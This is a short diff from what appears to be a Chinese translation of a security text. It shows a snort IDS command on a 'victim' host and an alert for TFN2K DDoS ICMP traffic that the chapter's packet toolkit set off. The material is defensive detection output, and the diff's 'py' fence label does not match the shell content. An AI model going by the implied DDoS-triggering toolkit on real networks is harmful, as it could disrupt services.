 
 分析 IDS 的日志，我们看到它很快就填满了八个警告消息。棒极了！我们的工具包工作了，本章结束！
 
-```
+```py
 victim# snort -q -A console -i eth0 -c /etc/snort/snort.conf
 03/14-11:45:01.060632 [**] [1:222:2] DDOS tfn2k icmp possible
     communication [**] [Classification: Attempted Denial of Service]
